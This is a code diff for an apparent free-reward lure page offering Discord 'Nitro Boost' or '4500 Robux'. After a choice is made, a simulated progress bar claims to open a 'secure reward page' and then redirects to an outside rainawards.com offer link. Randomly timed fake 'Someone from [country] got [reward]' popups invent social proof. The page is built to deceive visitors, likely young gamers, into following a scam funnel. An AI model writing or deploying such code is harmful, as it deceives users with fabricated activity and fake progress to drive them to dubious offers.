+    const actionsNoteEl = document.getElementById('actions-note');
     
     function selectChoice(card, title) {
       choiceCards.forEach(c => c.classList.remove('active'));
@@ -606,9 +753,8 @@
       selectedChoice = title;
       if (generateBtn) {
         generateBtn.disabled = false;
-        generateBtn.textContent = 'Claim Now';
       }
-      if (actionsNote) actionsNote.classList.add('hidden');
+      if (actionsNoteEl) actionsNoteEl.classList.add('hidden');
     }
     
     choiceCards.forEach(card => {
@@ -618,12 +764,12 @@
       });
     });
     
-    // --- Progress simulation + final redirect ---
+    // --- Progress + redirect ---
     const REDIRECT_URL = "https://rainawards.com/ow/69bf833f2d6a708a36f234d5";
     const progressDiv = document.getElementById('progress');
-    const statusText = document.getElementById('status-text');
-    const statusSub = document.getElementById('status-sub');
-    const barFill = document.getElementById('bar-fill');
+    const statusTextEl = document.getElementById('status-text');
+    const statusSubEl = document.getElementById('status-sub');
+    const barFillEl = document.getElementById('bar-fill');
     
     const progressSteps = [
       { label: "Preparing...", sub: "Opening a secure reward page for your session", min: 500, max: 750, target: 30 },
@@ -637,7 +783,6 @@
     
     function startProgress() {
       if (!selectedChoice) return;
-      
       choiceCards.forEach(c => c.classList.add('disabled'));
       generateBtn.disabled = true;
       progressDiv.classList.remove('hidden');
@@ -651,15 +796,13 @@
       let idx = 0;
       function advance() {
         const step = steps[idx];
-        statusText.innerText = step.label;
-        statusSub.innerText = step.sub;
-        barFill.style.transitionDuration = step.duration + "ms";
-        barFill.style.width = step.target + "%";
+        statusTextEl.innerText = step.label;
+        statusSubEl.innerText = step.sub;
+        barFillEl.style.transitionDuration = step.duration + "ms";
+        barFillEl.style.width = step.target + "%";
         const delay = step.duration + step.pause;
         if (idx >= steps.length - 1) {
-          setTimeout(() => {
-            window.location.href = REDIRECT_URL;
-          }, delay);
+          setTimeout(() => { window.location.href = REDIRECT_URL; }, delay);
           return;
         }
         idx++;
@@ -668,38 +811,27 @@
       advance();
     }
     
-    if (generateBtn) {
-      generateBtn.addEventListener('click', startProgress);
-    }
+    if (generateBtn) generateBtn.addEventListener('click', startProgress);
     
-    // --- Activity popups (only Nitro Boost or 4500 Robux, every ~25 seconds) ---
-    const toastContainer = document.getElementById('activity-toasts');
-    const locations = ["🇬🇧 UK", "🇺🇸 USA", "🇩🇪 Germany", "🇫🇷 France", "🇧🇷 Brazil", "🇯🇵 Japan", "🇦🇺 Australia", "🇨🇦 Canada", "🇪🇸 Spain", "🇮🇩 Indonesia", "🇳🇱 Netherlands", "🇸🇪 Sweden"];
-    const users = ["NitroHunter", "RewardSeeker", "PixelCraze", "BlazeRbx", "KuroiNeko", "MysticClaim", "VelvetAura", "ZenithX", "ExtvifyUser", "ShadowMorph", "AstraNexus", "LunarGhost"];
+    // --- Popups (left corner) ---
+    const locations = ["🇬🇧 UK", "🇺🇸 USA", "🇩🇪 Germany", "🇫🇷 France", "🇧🇷 Brazil", "🇯🇵 Japan", "🇦🇺 Australia", "🇨🇦 Canada", "🇪🇸 Spain", "🇮🇩 Indonesia"];
     
-    function showToast() {
-      if (!toastContainer) return;
-      const user = users[Math.floor(Math.random() * users.length)];
+    function showPopup() {
+      const container = document.getElementById('activity-toasts');
+      if (!container) return;
       const location = locations[Math.floor(Math.random() * locations.length)];
-      const reward = Math.random() > 0.5 ? "Nitro Boost" : "4500 Robux";
-      const seconds = Math.floor(Math.random() * 40) + 5;
+      const reward = Math.random() > 0.5 ? "Nitro Boost" : "4500 ROBUX";
+      const seconds = Math.floor(Math.random() * 45) + 5;
       const toast = document.createElement('div');
       toast.className = 'toast';
-      toast.innerHTML = `✨ Someone from ${location} got ${reward} · ${seconds} sec ago`;
-      toastContainer.appendChild(toast);
-      setTimeout(() => toast.remove(), 4800);
+      toast.innerHTML = `✨ Someone from ${location} got <strong>${reward}</strong> · ${seconds} sec ago`;
+      container.appendChild(toast);
+      setTimeout(() => { toast.style.opacity = '0'; toast.style.transition = 'opacity 0.3s'; setTimeout(() => toast.remove(), 300); }, 5000);
     }
     
-    // initial toast + interval
-    setTimeout(showToast, 3000);
-    setInterval(showToast, 25000);
-    // secondary random toasts
-    setInterval(() => {
-      if (Math.random() > 0.65) showToast();
-    }, 18000);
-    
-    // initial state
-    if (generateBtn.disabled && actionsNote) actionsNote.classList.remove('hidden');
+    setTimeout(showPopup, 2000);
+    setInterval(showPopup, 25000);
+    setInterval(() => { if (Math.random() > 0.65) showPopup(); }, 14000);
   })();
 </script>
 </body>
